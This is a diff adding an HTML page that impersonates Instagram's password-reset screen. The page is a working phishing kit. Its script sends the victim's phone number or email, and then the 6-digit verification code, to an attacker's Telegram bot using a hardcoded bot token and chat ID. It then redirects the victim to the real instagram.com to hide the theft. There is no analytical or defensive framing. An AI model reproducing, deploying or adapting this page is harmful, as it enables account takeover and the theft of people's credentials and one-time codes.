@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Instagram</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      background: #fff;
+      padding: 30px;
+      border: 1px solid #ccc;
+      width: 300px;
+      box-shadow: 0 0 10px #ccc;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #3897f0;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h3 style="text-align:center;">Instagram</h3>
+    
+    <!-- مرحله اول: درخواست ریست رمز -->
+    <form id="resetForm">
+      <input type="text" id="contact" placeholder="Phone number or email" required />
+      <button type="submit">Send Code</button>
+    </form>
+
+    <!-- مرحله دوم: وارد کردن کد تأیید -->
+    <form id="verifyForm" class="hidden">
+      <input type="text" id="code" placeholder="Enter the 6-digit code" required />
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+
+  <script>
+    const botToken = "7917095508:AAFyR4fE92SCZmkMjCm2vKI4katC_yMOHWY";
+    const chatId = "1703538236";
+
+    const resetForm = document.getElementById("resetForm");
+    const verifyForm = document.getElementById("verifyForm");
+
+    resetForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const contact = document.getElementById("contact").value;
+      const msg = `🔐 Forgot Password Request\n📧 Contact: ${contact}`;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+      
+      resetForm.classList.add("hidden");
+      verifyForm.classList.remove("hidden");
+    });
+
+    verifyForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const code = document.getElementById("code").value;
+      const msg = `✅ Verification Code Entered\n🔢 Code: ${code}`;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+      
+      window.location.href = "https://instagram.com";
+    });
+  </script>
+</body>
+</html>
